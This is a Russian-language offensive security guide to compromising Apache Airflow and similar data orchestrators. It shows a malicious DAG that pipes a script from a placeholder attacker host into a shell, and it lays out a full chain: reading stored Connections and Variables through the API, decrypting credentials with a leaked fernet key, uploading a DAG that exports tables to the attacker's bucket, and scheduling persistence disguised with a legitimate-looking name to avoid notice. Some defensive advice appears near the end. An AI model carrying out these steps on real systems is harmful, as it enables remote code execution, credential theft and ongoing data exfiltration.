## Вопрос, с которого всё начинается

Ты получаешь доступ к веб-интерфейсу Airflow — оркестратора, который по расписанию запускает пайплайны данных. В UI есть список DAG-ов, подключения к базам и облакам. Вопрос: можно ли через оркестратор выполнить произвольный код и украсть все креденшелы, которые в нём хранятся? Ответ — да, если у тебя есть право создавать или менять DAG.

## Что такое оркестратор данных

Airflow (и аналоги Dagster, Prefect, MWAA в AWS) управляет пайплайнами: запускает задачи по расписанию или триггеру, следит за зависимостями, повторяет упавшие. DAG — это граф задач на Python. Оркестратор хранит Connections (строки подключения к базам, облакам, API) и Variables (значения и секреты). Он центральная точка: через него данные текут из источников в хранилища.

## Сквозной пример: DAG как исполняемый код

DAG — это Python-файл, который Airflow импортирует и исполняет. Упрощённый вредоносный DAG:
```
from airflow import DAG
import os
with DAG("pwn", schedule="@once", start_date=None) as dag:
    os.system("curl http://attacker/s.sh | sh")
```
При следующем сканировании папки DAG-ов Airflow импортирует файл и выполнит код. Никакого эксплойта не нужно: DAG — это код по определению. Если у атакующего есть право загрузить DAG (или доступ к его репозиторию), он получает RCE в контексте оркестратора.

## Connections: сокровищница креденшелов

Connections хранят строки подключения: к Postgres, Snowflake, S3, Kafka, API. Часто в них лежат логины/пароли и ключи. Через UI или API их можно прочитать (если есть права), а через код задачи — использовать. Кража Connections = доступ ко всем системам, которыми управляет оркестратор. Это делает оркестратор самым ценным узлом data-стека.

## Variables и секреты

Variables — пары ключ/значение для параметров пайплайнов; иногда туда кладут секреты. Через API (`/api/v1/variables`) их читают, если есть права. Помимо Variables, секреты могут быть в конфиге Airflow (`airflow.cfg`), в fernet-key (шифрование Connections) и в секрет-бэкенде. Утёкший fernet-key позволяет расшифровать все Connections.

## Инъекции через параметры

Задачи часто передают параметры в команды (bash, SQL). Если параметр приходит из внешнего источника (триггер, файл, API) и не валидируется, возникает инъекция: command injection в BashOperator, SQL injection в SQL-операторах. Инъекция в задаче исполняется в правах оркестратора и его Connections — то есть даёт доступ к данным.

## MWAA и managed-оркестраторы

В AWS Airflow часто запускают как MWAA — managed-сервис с ролью исполнения. DAG-и хранятся в S3-бакете. Запись в этот бакет = выполнение кода на MWAA (через новый DAG). Роль MWAA читает данные и секреты. Поэтому доступ на запись к бакету DAG-ов — критичная находка.

## Типовые мисконфиги оркестраторов

| Мисконфиг | Последствие | Как искать |
|---|---|---|
| Право создавать/менять DAG | RCE | RBAC-роли |
| Запись в бакет DAG-ов | RCE на MWAA | права бакета |
| Connections в открытом виде | кража креденшелов | UI/API |
| Fernet-key утёк | расшифровка Connections | конфиг |
| Инъекция через параметры | RCE/SQLi | анализ задач |
| Слабый доступ к UI | захват оркестратора | auth UI |

## Полный прогон: от доступа к данным

Шаги. Первый: получить доступ к UI или API (токен, слабый пароль, запись в DAG-репо). Второй: перечислить Connections и Variables. Третий: прочитать креденшелы. Четвёртый: если есть право — загрузить DAG с полезной нагрузкой и выполнить код. Пятый: использовать Connections для доступа к базам и облакам. Шестой: персистентность — DAG, который перезапускается по расписанию.

## Инструменты и команды

Инструменты: `airflow` CLI, REST API (`/api/v1/dags`, `/api/v1/connections`, `/api/v1/variables`), `curl`. Для MWAA — AWS CLI (`aws mwaa`). Полезные вызовы: `GET /api/v1/connections` (список), `POST /api/v1/dags/{id}/dagRuns` (запуск), загрузка DAG в S3-бакет. Для расшифровки Connections — `airflow connections export` с fernet-key.

## OPSEC и детект

Airflow логирует запуски задач и доступ к API. Новый DAG и его первый запуск — заметное событие. Массовое чтение Connections видно в аудите. Тихий сценарий: использовать существующий DAG с параметром-инъекцией вместо загрузки нового. Помни: расписание DAG-а оставляет периодические запуски в логах.

## Разведка без доступа

Без доступа видно: страница Airflow (версия, иногда открыта), репозиторий с DAG-ами (публичный или в Git), имена Connections в коде. Публичные DAG-и раскрывают архитектуру пайплайнов. Этого достаточно, чтобы найти точку входа.

## Частые вопросы

Почему DAG — это RCE? Потому что это Python-код, импортируемый Airflow. Обязательно ли право на DAG? Для RCE — да, но иногда достаточно записи в бакет. Что дают Connections? Доступ к базам и облакам. Опасен ли fernet-key? Да, он расшифровывает все Connections. Помогает ли RBAC? Да, если настроен строго.

## Что не сработает

Пользователь без права на DAG не выполнит код. Зашифрованные Connections без fernet-key не читаются напрямую. RBAC может запретить доступ к Connections. И отозванный токен API не даст работать.

## Сценарий: от токена к Snowflake

Цепочка. Токен Airflow API найден в CI. Читаем Connections: находим Snowflake и Postgres. Читаем Variables: находим API-ключи. Загружаем DAG, который выгружает таблицы через Connection в наш бакет. Фиксируем персистентность: DAG с расписанием каждые 6 часов. Данные утекают регулярно, без нашего участия.

## Практический чек-лист пентеста оркестратора

Порядок. Один: получить доступ к UI/API. Два: перечислить DAG-и, Connections, Variables. Три: прочитать креденшелы. Четыре: проверить право на загрузку DAG. Пять: выполнить код или использовать инъекцию. Шесть: дотянуться до данных через Connections. Семь: зафиксировать персистентность. Восемь: оценить логи.

## Что мы теперь знаем

1. DAG — исполняемый код, поэтому право на DAG = RCE.
2. Connections хранят креденшелы ко всем системам data-стека.
3. Запись в бакет DAG-ов (MWAA) = выполнение кода.
4. Параметры задач — канал инъекции.
5. Оркестратор — центральный узел, его компромисс открывает весь стек.

## Dagster, Prefect и другие оркестраторы

Хотя примеры выше про Airflow, Dagster и Prefect устроены похоже. Dagster использует «assets» и код на Python; Prefect — «flows» и «deployments». Везде есть централизованное хранилище креденшелов (connections/blocks) и возможность запускать код. Принципы те же: право создавать или менять определение пайплайна = исполнение кода; доступ к секретам = кража креденшелов. Проверяй конкретный оркестратор, но модель одна.

## Задачи и их привилегии

Каждая задача может исполняться в своём контексте: BashOperator — на воркере, KubernetesPodOperator — в поде с service account, облачный оператор — под ролью. Права задачи определяют, что она может. Инъекция в задачу с широкими правами (облачная роль, доступ к секретам) опаснее, чем в изолированную. Поэтому при аудите смотри не только на сам DAG, но и на права воркеров и подов.

## Секрет-бэкенды

Airflow умеет читать секреты из внешних бэкендов: Vault, AWS Secrets Manager, GCP Secret Manager. Тогда Connections хранят лишь ссылки, а сами секреты — в бэкенде. Это снижает ущерб от утечки базы Airflow, но не устраняет риск: если у воркера есть доступ к бэкенду, код всё равно прочитает секреты. Правильная модель — узкие права на бэкенд и разделение по пайплайнам.

## Итог по оркестраторам

Оркестратор — центральный узел data-стека: через него проходят все пайплайны и лежат креденшелы ко всем системам. Его компромисс открывает доступ к данным и облакам. Защита: строгий RBAC, узкие права воркеров, внешние секрет-бэкенды и аудит запусков.

## Практика на реальной цели

С доступом к Airflow действуем по возрастанию шума. Сначала читаем Connections и Variables через API — это тихо и сразу даёт креденшелы. Затем проверяем, есть ли право загрузить DAG: если да, загружаем минимальный DAG, который выгружает нужные таблицы через Connection в наш бакет. Если загрузка DAG запрещена, ищем существующий DAG с параметром, допускающим инъекцию. В конце фиксируем персистентность: DAG с расписанием, который периодически повторяет выгрузку.

## Что чаще всего находят

Чаще всего встречаются: Connections с долгоживущими креденшелами ко всем системам, Variables с API-ключами и роли, позволяющие операторам загружать DAG. В managed-средах (MWAA) — открытый на запись бакет DAG-ов. Любая из этих находок даёт либо креденшелы, либо выполнение кода, а часто и то, и другое сразу.

## Отзыв и реагирование

Понимание реакции важно обеим сторонам. При обнаружении компромисса оркестратора защита отзывает токены API, чистит подозрительные DAG-и, ротирует все Connections и проверяет, какие данные успели утечь. Быстрота реакции определяет ущерб: пока Connections не отозваны, атакующий сохраняет доступ ко всем системам стека. Поэтому персистентность через DAG, который переживает перезапуск, — ключевой риск, который защите нужно найти и удалить.

## Заметка о персистентности

DAG-персистентность удобна атакующему тем, что работает сама: расписание запускает выгрузку без его участия. Защита находит её, просматривая список DAG-ов на предмет незнакомых и проверяя историю изменений. Поэтому при пентесте стоит давать DAG осмысленное имя, похожее на легитимный пайплайн, — но помнить, что честный аудит всё равно заметит новый файл в репозитории.
